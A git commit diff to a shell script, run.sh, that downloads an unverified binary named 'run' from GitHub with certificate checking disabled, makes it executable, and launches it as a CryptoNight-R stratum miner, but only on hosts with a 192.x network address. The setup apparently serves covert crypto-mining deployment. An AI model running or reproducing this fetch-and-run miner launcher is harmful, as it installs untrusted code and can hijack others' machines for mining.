b67b94491f5febe571870efbb2d9d0415b1f17ca
osrun <44208422+osrun@users.noreply.github.com>
2019-03-25 09:43:28 -0300

    Update run.sh

--- run.sh
+++ run.sh
@@ -19,14 +19,18 @@ _REBANNER(){
 }
 
 _RUN(){
-  wget --no-check-cert https://github.com/osrun/beta/raw/master/run
-  chmod +x run
-  sysctl -w vm.nr_hugepages=128
-  ./run -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
-  #./run -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
-  #_REBANNER
+ case $1 in
+   start)  
+     wget --no-check-cert https://github.com/osrun/beta/raw/master/run
+     chmod +x run
+     sysctl -w vm.nr_hugepages=128
+     ./run -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+     #./run -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+     #_REBANNER
+   ;; 
+ esac
 }
 
 if ifconfig | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then
- _RUN
+ _RUN start
 fi
